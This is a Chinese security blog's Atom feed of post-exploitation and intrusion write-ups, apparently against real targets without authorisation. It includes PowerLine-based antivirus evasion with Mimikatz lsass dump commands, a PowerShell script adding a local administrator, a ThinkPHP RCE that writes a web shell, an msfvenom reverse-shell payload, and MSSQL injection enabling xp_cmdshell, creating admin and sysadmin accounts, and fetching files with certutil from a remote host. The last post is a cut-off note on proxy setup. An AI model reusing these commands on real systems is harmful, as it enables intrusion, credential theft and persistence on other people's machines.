<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hello_C技术博客</title>
  <subtitle>一个小白的独白！</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://zjw.dropsec.xyz/"/>
  <updated>2019-12-24T13:43:26.711Z</updated>
  <id>https://zjw.dropsec.xyz/</id>
  
  <author>
    <name>Hello_C</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PowerShell之PowerLine.md</title>
    <link href="https://zjw.dropsec.xyz/%E6%B8%97%E9%80%8F/2019/12/24/PowerShell%E4%B9%8BPowerLine.html"/>
    <id>https://zjw.dropsec.xyz/渗透/2019/12/24/PowerShell之PowerLine.html</id>
    <published>2019-12-24T13:36:43.000Z</published>
    <updated>2019-12-24T13:43:26.711Z</updated>
    
    <content type="html"><![CDATA[<p>　　在平时后渗透中，powershell是我们常用的脚本和方法，但是大多数杀软已经将直接调用powershell拦截，找到一个比较好的加载编译工具显得十分重要，这里只是简单的分享一下前一段时间发现的一款工具，用的比较顺手简单。</p>
<h2 id="0x01-PowerLine"><a href="#0x01-PowerLine" class="headerlink" title="0x01 PowerLine"></a>0x01 PowerLine</h2><p><a href="https://github.com/fullmetalcache/PowerLine" target="_blank" rel="external">下载链接</a><a id="more"></a><br><img src="https://i.loli.net/2019/12/24/3KVLXle27nY8C4j.png" alt="1.png"><br><strong>优点：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1、快速安装、编译、运行，不需要安装Visual Studio PowerShell</div><div class="line">2、对加载的powershell脚本进行编码绕过</div><div class="line">3、执行编译好的exe，脚本在内存中运行</div></pre></td></tr></table></figure></p>
<p><strong>缺点：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1、需要对目标系统版本号了解，本地搭建相同环境编译</div><div class="line">2、运行需要按照powershell执行方式</div></pre></td></tr></table></figure></p>
<h2 id="0x02-安装、编译"><a href="#0x02-安装、编译" class="headerlink" title="0x02 安装、编译"></a>0x02 安装、编译</h2><p>整个代码框架如下，脚本家在加载配置文件为<strong>UserConf.xml</strong>。<br><img src="https://i.loli.net/2019/12/24/V9tH5K6ZWXuBzno.png" alt="2.png"><br>使用过程如下：<br>1、运行build.bat<br><img src="https://i.loli.net/2019/12/24/xYLQa3GU9bpXVh2.png" alt="3.png"><br>2、配置UserConf.xml文件，修改为需要远程加载编译的URL，自己本地的话把写好的powershell放到自己起的web里面就行。<br><img src="https://i.loli.net/2019/12/24/tRVD7mwgBhxfYsI.png" alt="4.png"><br>3、运行PLBuilder.exe，回根据运行的系统版本编译成对应的exe<br><img src="https://i.loli.net/2019/12/24/5frOU43nNHxCBPR.png" alt="5.png"><br>整个流程就这简单的三步，会在目录下生成1个PowerLine.exe，7个常见的ps脚本已经编译在里面了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PowerLine.exe -ShowScripts //显示嵌入的脚本</div></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/12/24/dMlVaJAOWSi9cqz.png" alt="6.png"><br>之后可以根据每个脚本的使用命令执行相关的操作。</p>
<h2 id="0x03-后渗透"><a href="#0x03-后渗透" class="headerlink" title="0x03 后渗透"></a>0x03 后渗透</h2><p><strong>1、Minikatz</strong><br>普通的Minikatz已经被各大杀软查杀，都修改源码重新编译进行绕过，使用PowerLine加载Minikatz.ps也可以绕过一些免杀。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//dump lsass.exe </div><div class="line">PowerLine.exe Invoke-Mimikatz &quot;Invoke-Mimikatz -Command \&quot;`\&quot;privilege::debug`\&quot; `\&quot;sekurlsa::logonPasswords`\&quot;\&quot;&quot;</div><div class="line">//dump lsass.exe 为dmp</div><div class="line">PowerLine.exe Invoke-Mimikatz &quot;Invoke-Mimikatz -Command \&quot;`\&quot;sekurlsa::minidump lsass_dump_name.dmp`\&quot; `\&quot;sekurlsa::logonPasswords`\&quot;\&quot;&quot;</div></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/12/24/oeIK7PCfT21wtYD.gif" alt="7.gif"><br>直接dump密码这种360可以检测到了，其他2款没有检测到。<br><strong>2、添加用户</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">For($i=0;$i -lt $args.Count; $i++)</div><div class="line">&#123;</div><div class="line">    $User = $($args[0]);</div><div class="line">	$Passwd = $($args[1]);</div><div class="line">&#125;</div><div class="line">$Computer = [ADSI]&quot;WinNT://$Env:COMPUTERNAME,Computer&quot;;</div><div class="line">$CompStat = Get-WmiObject win32_computersystem;</div><div class="line">$Computer2 = $CompStat.Name;</div><div class="line">$LocalAdmin = $Computer.Create(&quot;User&quot;, $User);</div><div class="line">$LocalAdmin.SetPassword($Passwd);</div><div class="line">$LocalAdmin.SetInfo();</div><div class="line">$group = [ADSI](&apos;WinNT://&apos; + $Computer2 + &apos;/Administrators,group&apos;);</div><div class="line">$adduser = (&quot;WinNT://&quot; + $Computer2 + &quot;/&quot; + $User);</div><div class="line">$group.add($adduser);</div></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/12/24/owPbxh2tfWgX5pH.gif" alt="8.gif"><br>几款杀软都没有检测到。<br><strong>3、截图</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">function Get-ScreenCapture</div><div class="line">&#123;</div><div class="line">    param(    </div><div class="line">    [Switch]$OfWindow        </div><div class="line">    )</div><div class="line"></div><div class="line"></div><div class="line">    begin &#123;</div><div class="line">        Add-Type -AssemblyName System.Drawing</div><div class="line">        $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | </div><div class="line">            Where-Object &#123; $_.FormatDescription -eq &quot;JPEG&quot; &#125;</div><div class="line">    &#125;</div><div class="line">    process &#123;</div><div class="line">        Start-Sleep -Milliseconds 250</div><div class="line">        if ($OfWindow) &#123;            </div><div class="line">            [Windows.Forms.Sendkeys]::SendWait(&quot;%&#123;PrtSc&#125;&quot;)        </div><div class="line">        &#125; else &#123;</div><div class="line">            [Windows.Forms.Sendkeys]::SendWait(&quot;&#123;PrtSc&#125;&quot;)        </div><div class="line">        &#125;</div><div class="line">        Start-Sleep -Milliseconds 250</div><div class="line">        $bitmap = [Windows.Forms.Clipboard]::GetImage()    </div><div class="line">        $ep = New-Object Drawing.Imaging.EncoderParameters  </div><div class="line">        $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)  </div><div class="line">        $screenCapturePathBase = &quot;$pwd\ScreenCapture&quot;</div><div class="line">        $c = 0</div><div class="line">        while (Test-Path &quot;$&#123;screenCapturePathBase&#125;$&#123;c&#125;.jpg&quot;) &#123;</div><div class="line">            $c++</div><div class="line">        &#125;</div><div class="line">        $bitmap.Save(&quot;$&#123;screenCapturePathBase&#125;$&#123;c&#125;.jpg&quot;, $jpegCodec, $ep)</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/12/24/rAxiDIX3fvkyPNB.gif" alt="9.gif"></p>
<p>　　这里只是尝试了常见的后渗透利用方法，利用powershell后渗透还是很有成效。大家可以使用PS实现其他功能。虽然现在不杀，不一定之后还能用，且用且珍惜。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;　　在平时后渗透中，powershell是我们常用的脚本和方法，但是大多数杀软已经将直接调用powershell拦截，找到一个比较好的加载编译工具显得十分重要，这里只是简单的分享一下前一段时间发现的一款工具，用的比较顺手简单。&lt;/p&gt;
&lt;h2 id=&quot;0x01-PowerLine&quot;&gt;&lt;a href=&quot;#0x01-PowerLine&quot; class=&quot;headerlink&quot; title=&quot;0x01 PowerLine&quot;&gt;&lt;/a&gt;0x01 PowerLine&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/fullmetalcache/PowerLine&quot;&gt;下载链接&lt;/a&gt;
    
    </summary>
    
      <category term="渗透" scheme="https://zjw.dropsec.xyz/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="https://zjw.dropsec.xyz/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="PowerShell" scheme="https://zjw.dropsec.xyz/tags/PowerShell/"/>
    
  </entry>
  
  <entry>
    <title>内网中的端口扫描</title>
    <link href="https://zjw.dropsec.xyz/%E6%B8%97%E9%80%8F/2019/07/08/%E5%86%85%E7%BD%91%E4%B8%AD%E7%9A%84%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F.html"/>
    <id>https://zjw.dropsec.xyz/渗透/2019/07/08/内网中的端口扫描.html</id>
    <published>2019-07-08T13:42:17.000Z</published>
    <updated>2019-07-08T15:33:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>　　在渗透测试中，一般在拿下权限之后，一方面搜集本机的信息，包括：IP、口令、令牌等信息；另一方面就是判断内网的存活主机，是否存在域环境，对内网进行下一步的渗透。那么在内网进行端口扫描是必不可少的一部分，虽然有时候在内网进行大批量扫描可能会引发IDS、IPS等设备的告警，这个平时也是需要注意的。这里我们不考虑大流量的这部分，主要讨论在内网中的端口扫描。<a id="more"></a></p>
<h3 id="0x01-Windows"><a href="#0x01-Windows" class="headerlink" title="0x01 Windows"></a>0x01 Windows</h3><p>　　在内网中，通常用的最多的就是Nmap和Masscan。但是在命令行中，我们使用静默安装方式，安装Nmap和Masscan，这里就不介绍两款工具的使用，网上都有很多的教程，主要讨论命令行下的静默安装两款工具进行扫描。<br><strong>Masscan</strong><br>　　<a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="external">Masscan</a>，号称3分钟(更快)扫完全网端口，github有linux安装教程，当然我们可以对他进行编译exe，在Windows下就可以运行了。<br>　　Masscan在windows下运行的，需要安装WinPcap，否则会出现下面报错，这里需要我们安装WinPcap。<br><img src="https://i.loli.net/2019/07/08/5d2352037fda578072.png" alt="1.png"><br>　　安装的<a href="https://www.winpcap.org/install/default.htm" target="_blank" rel="external">WinPcap</a>可以在此处下载，这里使用静默安装的方式进行安装，<strong>WinPcap.exe /S</strong><br><img src="https://i.loli.net/2019/07/08/5d2353b4d3d1877997.png" alt="2.png"><br><img src="https://i.loli.net/2019/07/08/5d2353d3b054297877.png" alt="3.png"><br>　　经过上面的一系列操作，masscan已经可以启动运行了，可以对内网进行扫描啦。<br><img src="https://i.loli.net/2019/07/08/5d2353fd0b96a56550.png" alt="4.png"><br>　　这里假设我们进入内网对里面的MS17010进行批量扫描，常用的命令<strong>masscan.exe –p445 10.0.0.0/8 –rate=100000 -oX scan_result.xml</strong>，这里我们输出结果为xml格式，然后使用python脚本对xml文档进行提取，保存为txt和xls。<br><img src="https://i.loli.net/2019/07/08/5d235751df45523270.png" alt="5.png"><br><img src="https://i.loli.net/2019/07/08/5d2357c9d57fc86352.png" alt="6.png"><br>　　对保存好的IP可以进行批量的MS17010扫描和利用，之后就可以进一步利用了。<br><strong>Nmap</strong><br>　　Nmap，日常渗透扫描必备，也可以进行命令行下静默安装，主要参考三好师傅的博客利用方式。Nmap也要在命令行提前安装WinPcap，和上面的安装方式一样，使用<strong>WinPcap.exe /S</strong>命令安装。下载安装好的压缩包，可以直接运行的那种，删除一些不必要的文件，还要添加vs2013的dll：msvcp120.dll和msvcr120.dll(Nmap.exe通过vs2013编译)，精简如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">libeay32.dll</div><div class="line">msvcp120.dll</div><div class="line">msvcr120.dll</div><div class="line">nmap-mac-prefixes</div><div class="line">nmap-os-db</div><div class="line">nmap-payloads</div><div class="line">nmap-services</div><div class="line">nmap.exe</div><div class="line">ssleay32.dll</div></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/07/08/5d23597e1c02f23296.png" alt="7.png"><br>　　但是精简下来也挺大，需要进行打包压缩，为了避免目标上没有解压软件，这里选择使用自解压模式进行压缩，以后解压就不用压缩工具了。使用sfx格式压缩，打包下来也就6兆左右。<br><img src="https://i.loli.net/2019/07/08/5d235a67dd87e77462.png" alt="8.png"><br>　　直接运行nmap就可以直接解压，可以完美的运行扫描端口啦。<br><img src="https://i.loli.net/2019/07/08/5d235b553b6c097001.png" alt="9.png"><br><strong>Nbtscan</strong><br>　　nbtscan只能用于局域网<br><img src="https://i.loli.net/2019/07/08/5d235d620108e55820.png" alt="11.png"></p>
<h3 id="0x02-Linux"><a href="#0x02-Linux" class="headerlink" title="0x02 Linux"></a>0x02 Linux</h3><p><strong>Nmap</strong><br>　　Linux下可能有的目标安装有nmap，可以直接利用，没有的话如果出网的话可以在线安装扫描完成之后删除就行。<br><strong>Netcat</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -z -v 192.168.220.128 80-9999      #z代表不交互要不然遇到交互的端口nc会阻塞，v代表打印端口情况不然扫了也没办理出，下来是IP和要扫描的端口</div></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/07/08/5d235fb30358614449.jpg" alt="1.jpg"><br><strong>Nbtscan</strong><br>　　Nbtscan也有Linux版，也可以对端口扫描。<br><strong>RASscan</strong><br>　　<a href="https://github.com/RASSec/RASscan" target="_blank" rel="external">RASscan</a>，python脚本写的对内网可以进行扫描。<br>参考链接：<br><a href="https://www.4hou.com/penetration/6173.html" target="_blank" rel="external">https://www.4hou.com/penetration/6173.html</a><br><a href="https://www.lz1y.cn/2019/04/30/Windows%E4%B8%8B%E9%9D%99%E9%BB%98%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8nmap/index.html" target="_blank" rel="external">https://www.lz1y.cn/2019/04/30/Windows%E4%B8%8B%E9%9D%99%E9%BB%98%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8nmap/index.html</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%B9%B3%E5%8F%B0%E8%BF%90%E8%A1%8CMasscan%E5%92%8CNmap/" target="_blank" rel="external">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%B9%B3%E5%8F%B0%E8%BF%90%E8%A1%8CMasscan%E5%92%8CNmap/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;　　在渗透测试中，一般在拿下权限之后，一方面搜集本机的信息，包括：IP、口令、令牌等信息；另一方面就是判断内网的存活主机，是否存在域环境，对内网进行下一步的渗透。那么在内网进行端口扫描是必不可少的一部分，虽然有时候在内网进行大批量扫描可能会引发IDS、IPS等设备的告警，这个平时也是需要注意的。这里我们不考虑大流量的这部分，主要讨论在内网中的端口扫描。
    
    </summary>
    
      <category term="渗透" scheme="https://zjw.dropsec.xyz/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="https://zjw.dropsec.xyz/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="实战" scheme="https://zjw.dropsec.xyz/tags/%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>一次disable_functions绕过</title>
    <link href="https://zjw.dropsec.xyz/%E6%B8%97%E9%80%8F/2019/04/09/%E4%B8%80%E6%AC%A1disable-functions%E7%BB%95%E8%BF%87.html"/>
    <id>https://zjw.dropsec.xyz/渗透/2019/04/09/一次disable-functions绕过.html</id>
    <published>2019-04-09T13:14:34.000Z</published>
    <updated>2019-04-09T13:27:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>　　一次偶然的机会，在搞目标的过程中，在目标C段发现一个TP5的站，主站搞不下来，看看能不能搞个C段的嗅探一下。于是就用之前爆出的exp随手搞一下，练练手。目标<a href="http://xxxxx.com/index/login/index.html" target="_blank" rel="external">http://xxxxx.com/index/login/index.html</a><br><img src="https://i.loli.net/2019/04/09/5cac9b5490cd9.png" alt="1.png"><a id="more"></a><br><img src="https://i.loli.net/2019/04/09/5cac9b548339a.png" alt="2.png"></p>
<p>　　直接使用EXP测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/index.php?s=index/\think\app/invokefunction&amp;function=phpinfo&amp;vars[0]=100</div></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/04/09/5cac9b54a373a.png" alt="3.png"><br>　　写入文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=加你要写入的文件内容url编码</div></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/04/09/5cac9b54bc8cb.png" alt="4.png"><br><img src="https://i.loli.net/2019/04/09/5cac9b54da1c9.png" alt="5.png"><br>　　一看disable_functions，这么多被禁用了。<br><img src="https://i.loli.net/2019/04/09/5cac9b54b061e.png" alt="6.png"><br><strong>方法一：</strong><br>　　一般这样我先使用的是<strong>weevely</strong>，即使禁用一些函数，可以执行一下常见的命令，工具也比较好，这里值得推荐大家使用，网上也有好多教程，操作比较简单。<br><img src="https://i.loli.net/2019/04/09/5cac9b54cb57e.png" alt="8.png"><br><img src="https://i.loli.net/2019/04/09/5cac9b54b9360.png" alt="9.png"><br>　　可以执行一些简单的命令，但是一些跨目录什么的不能执行，换一种方法试试。</p>
<p><strong>方法二：</strong><br>　　发现存在–enable-pcntl，可以尝试使用pcntl_exec绕过。pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求： PHP 4 &gt;= 4.2.0, PHP 5 on linux。<br><img src="https://i.loli.net/2019/04/09/5cac9b54c3779.png" alt="7.png"><br>　　这里我使用weevely远程下载pcntl_exec执行反弹shell，也可以直接上传文件，使用help或者table按键可以查看weevely的一些命令。<br><img src="https://i.loli.net/2019/04/09/5cac9c8872453.png" alt="11.png"><br>　　但是还是有一些命令不能执行。<br><img src="https://i.loli.net/2019/04/09/5cac9c885f867.png" alt="12.png"><br><img src="https://i.loli.net/2019/04/09/5cac9c884dd12.png" alt="13.png"><br><strong>方法三：</strong><br>　　使用MSF生成elf文件，不依赖于php，可以执行命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=xxxx LPORT=4444 -f elf &gt; shell.elf</div></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/04/09/5cac9c8856fab.png" alt="15.png"><br><img src="https://i.loli.net/2019/04/09/5cac9c8838a03.png" alt="16.png"><br><img src="https://i.loli.net/2019/04/09/5cac9c886f03b.png" alt="17.png"><br>　　这一次终于绕过可以执行任意命令了。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;　　一次偶然的机会，在搞目标的过程中，在目标C段发现一个TP5的站，主站搞不下来，看看能不能搞个C段的嗅探一下。于是就用之前爆出的exp随手搞一下，练练手。目标&lt;a href=&quot;http://xxxxx.com/index/login/index.html&quot;&gt;http://xxxxx.com/index/login/index.html&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2019/04/09/5cac9b5490cd9.png&quot; alt=&quot;1.png&quot;&gt;
    
    </summary>
    
      <category term="渗透" scheme="https://zjw.dropsec.xyz/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="https://zjw.dropsec.xyz/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="实战" scheme="https://zjw.dropsec.xyz/tags/%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>一次曲折的注入</title>
    <link href="https://zjw.dropsec.xyz/%E6%B8%97%E9%80%8F/2019/04/05/%E4%B8%80%E6%AC%A1%E6%9B%B2%E6%8A%98%E7%9A%84%E6%B3%A8%E5%85%A5.html"/>
    <id>https://zjw.dropsec.xyz/渗透/2019/04/05/一次曲折的注入.html</id>
    <published>2019-04-05T04:17:08.000Z</published>
    <updated>2019-04-05T04:53:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>　　之前写了好多的实战文章，由于敏感都在本地记录了，等网站漏洞修复完成之后慢慢的分享一些思路和技巧。本文首发于tools，然后在博客转载。一次偶然发现了一处注入，apsx注入，之前练得少，决定试一试看看，先sqlmap跑一波。<br><img src="https://i.loli.net/2019/04/05/5ca6d8e263401.png" alt="1.png"><a id="more"></a><br><img src="https://i.loli.net/2019/04/05/5ca6d91846151.png" alt="1.png"><br>　　500报错，可能跑不出来，于是试试手工，sqlmap被拦了，但是手工很顺利，可能是加了sqlmap的指纹了吧；<br><img src="https://i.loli.net/2019/04/05/5ca6d95c4eabd.png" alt="1.png"><br>判断版本’ or @@version&gt;0 –<br><img src="https://i.loli.net/2019/04/05/5ca6da05dbb91.png" alt="1.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">计算机名 &apos; or @@SERVERNAME&gt;0 --</div><div class="line">爆当前数据库名 &apos; or db_name()&gt;0 --</div></pre></td></tr></table></figure></p>
<p>　　网站没有找见后台，想着跑出来密码也没有登录地方，于是那些查找数据库、表名、字段名就直接略过，跑出来也登不进去。先看看其他网站，于是先跑一下二级域名以及旁站，bing查询确实很棒，可以查出好多旁站，极力推荐；<br>　　发现三处旁站，一个php的、一个oa还有一个致远协同，没有可以利用的地方，还是先看看注入吧；<br>先看注入, 当前用户  ‘ or user_name()&gt;0 –<br><img src="https://i.loli.net/2019/04/05/5ca6da5d646ae.png" alt="2.png"><br>判断是否支持多句查询’;declare @s int;–<br><img src="https://i.loli.net/2019/04/05/5ca6dac283e46.png" alt="3.png"><br>查看一下xp_cmdshell是否开启<br><img src="https://i.loli.net/2019/04/05/5ca6dac29c287.png" alt="4.png"><br>首先开启一下xp_cmdshell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;;EXEC sp_configure &apos;show advanced options&apos;, 1;RECONFIGURE;EXEC sp_configure &apos;xp_cmdshell&apos;, 1;RECONFIGURE;--</div></pre></td></tr></table></figure></p>
<p>　　显示登录成功，则是命令执行成功，成功开启xp_cmdshell，然后可以执行命令了，但是执行命令没有回显，正常现象；直接添加用户，显示执行成功，但是没有用户添加上，郁闷，之后才发现是火绒的问题。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&apos;;exec master..xp_cmdshell &apos;net user web$ Web123!@# /add&apos;;--</div><div class="line">&apos;;exec master..xp_cmdshell &apos;net localgroup administrators web$ /add&apos;;--</div></pre></td></tr></table></figure></p>
<p>执行cmd获取回显：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&apos;;create table temp(id int identity(1,1),a varchar(8000));--   创建一个表</div><div class="line">&apos;;insert into temp exec master.dbo.xp_cmdshell &apos;whoami&apos;; --   执行cmd指令并且插入到表中</div><div class="line">&apos; and (select substring((select a from temp for xml auto),1,8000))&gt;0;-- 可以一次得到所有的结果</div><div class="line">&apos;;drop table temp;--  删除表</div></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/04/05/5ca6dac38cc59.png" alt="5.png"><br><img src="https://i.loli.net/2019/04/05/5ca6dac395068.png" alt="6.png"><br>目标显示开启了1433,3389,3306端口，于是可以添加sa用户然后远程连接，增加sa用户：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&apos;;exec master.dbo.sp_addlogin test,password;--</div><div class="line">&apos;;exec master.dbo.sp_addsrvrolemember test,sysadmin;--</div></pre></td></tr></table></figure></p>
<p>可以直接连接，方便好多，比刚才执行命令舒服了好多；<br><img src="https://i.loli.net/2019/04/05/5ca6dac29f752.png" alt="7.png"><br>　　完美，可以直接执行命令，美滋滋。CS或者Msf直接撸之，但是没有vps就很心疼啊，只能找个shell远程下载了。发现旁站php的配置文件，然后还有phpmyadmin，这里有几个思路拿shell:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">直接远程下载到web路径；</div><div class="line">旁站phpmyadmin后台拿shell;</div><div class="line">旁站登录后台拿shell;</div></pre></td></tr></table></figure></p>
<p>第一个：<br>　　直接下载，然后，或者直接下载wce或者procdump.exe直接读取管理员密码然后登录，美滋滋。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">certutil.exe -urlcache -split -f http://xxx/uploads/conf1g.txt conf1g.php</div><div class="line">move conf1g.php  E:\xxxxx\   失败</div></pre></td></tr></table></figure></p>
<p>　　直接500报错，看来是有waf，难怪slamp一直跑不出来，直接换个过狗的吧<br><img src="https://i.loli.net/2019/04/05/5ca6dac299159.png" alt="8.png"><br><img src="https://i.loli.net/2019/04/05/5ca6dc30a96f1.png" alt="9.png"><br><img src="https://i.loli.net/2019/04/05/5ca6dac29dcff.png" alt="10.png"><br>第二个:<br>　　phpmyadmin后台登录几种建表方式没有成功，然后日志写shell也没有成功<br><img src="https://i.loli.net/2019/04/05/5ca6dcaaca072.png" alt="11.png"><br><img src="https://i.loli.net/2019/04/05/5ca6dcaaec89e.png" alt="12.png"><br>第三种<br>　　php站进入后台拿shell，密码还没有解开，暂时无法登录拿shell</p>
<p>　　还是用第一种方法吧，最近发布的冰蝎管理shell，免杀还是不错的，大马带小马，可以简单操作了<br><img src="https://i.loli.net/2019/04/05/5ca6dcaae3207.png" alt="13.png"><br>抓hash<br>wce  失败<br>Procdump导出，使用mimikatz<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mimikatz# sekurlsa::minidump lsass.dmp</div><div class="line">mimikatz# sekurlsa::logonPasswords full</div></pre></td></tr></table></figure></p>
<p><img src="https://i.loli.net/2019/04/05/5ca6dcaadde71.png" alt="14.png"><br>成功拿到密码登录，直接登录之，之后就不截图了，进去之后发现已经有人光顾过了，有点厉害。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;　　之前写了好多的实战文章，由于敏感都在本地记录了，等网站漏洞修复完成之后慢慢的分享一些思路和技巧。本文首发于tools，然后在博客转载。一次偶然发现了一处注入，apsx注入，之前练得少，决定试一试看看，先sqlmap跑一波。&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2019/04/05/5ca6d8e263401.png&quot; alt=&quot;1.png&quot;&gt;
    
    </summary>
    
      <category term="渗透" scheme="https://zjw.dropsec.xyz/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="https://zjw.dropsec.xyz/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="实战" scheme="https://zjw.dropsec.xyz/tags/%E5%AE%9E%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>科学上网</title>
    <link href="https://zjw.dropsec.xyz/%E6%B8%97%E9%80%8F/2018/07/23/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91.html"/>
    <id>https://zjw.dropsec.xyz/渗透/2018/07/23/科学上网.html</id>
    <published>2018-07-23T13:19:50.000Z</published>
    <updated>2018-07-23T14:16:58.000Z</updated>
    
    <content type="html"><![CDATA[<p>　　如今有时候想出去查点资料，奈何法力不够，肉身翻不出去，于是就找了找相关知识，试试可不可以出去看看。首先我们需要有一个国外的vps，推荐搬瓦工或者Vultr，具体可以<a href="https://buy.shangyufeidi.com/vultr/vultr-vs-bwg/" target="_blank" rel="external">参考</a>自己进行选择。一般都有一键搭建ss或者ssr，简单方便、傻瓜化教程。<br><a id="more"></a></p>
